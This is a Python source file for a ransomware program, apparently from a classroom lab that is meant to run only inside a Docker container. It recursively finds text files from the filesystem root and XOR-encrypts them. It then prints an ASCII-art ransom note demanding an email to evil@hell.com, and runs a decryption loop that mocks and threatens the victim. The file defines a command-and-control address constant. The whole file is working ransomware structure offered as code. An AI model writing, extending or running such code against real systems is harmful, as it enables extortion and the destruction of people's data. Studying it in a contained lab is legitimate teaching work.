import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # return all files matching the filter

        #Path('/') pour partir de la racine du système
        #rglob renvoie l'addresse absolue ici car on par de la racie système
        files_list=Path('/').rglob(filter)

        return files_list

    def encrypt(self):
        # main function for encrypting (see PDF)
        files_list=self.get_files('txt')
        sm=SecretManager()
        sm.setup()
        sm.xorfiles(files_list)
        print(ENCRYPT_MESSAGE.format(token=sm.get_hex_token()))

    def decrypt(self):
        # main function for decrypting (see PDF)
        sm=SecretManager()
        files_list=self.get_files('txt')
        sm.load()
        while True:
            try:
                candidate_key = input("Enter your key here (be carefull:] ) : ")  
                sm.set_key(candidate_key) #On va verifier la clef ici, si pas la bonne clé alors erreur (car pas de return pour ce cas la) et on va catch l'erreur avec le except
                sm.xorfiles(files_list)  #Si on est arrivé ici la clé est bonne donc on peut déchiffrer les fichiers, on a qu'une parole
                sm.clean() #On laisse aucune trace, un ptit coup de Mr Propre et pouf plus rien
                print("Success, thank you for your money. Have a great day sir, hoping to have buisness with you again ^_^") 
                break  

            except Exception as e: 
                print("Wrong key >:[, don't try being a smart guy or i'll delete a file.") 
                continue 



if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()